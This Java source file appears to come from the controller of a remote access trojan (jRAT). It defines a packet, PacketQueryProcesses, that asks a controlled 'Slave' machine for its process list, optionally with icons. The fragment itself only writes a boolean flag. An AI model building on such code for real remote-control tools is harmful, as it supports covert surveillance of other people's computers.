package jrat.module.process;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.AbstractOutgoingPacket;

import java.io.DataOutputStream;


public class PacketQueryProcesses extends AbstractOutgoingPacket {
	
	private boolean icons;
	
	public PacketQueryProcesses() {
		this(false);
	}
	
	public PacketQueryProcesses(boolean icons) {
		this.icons = icons;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(icons);
	}

	@Override
	public short getPacketId() {
		return 19;
	}

}
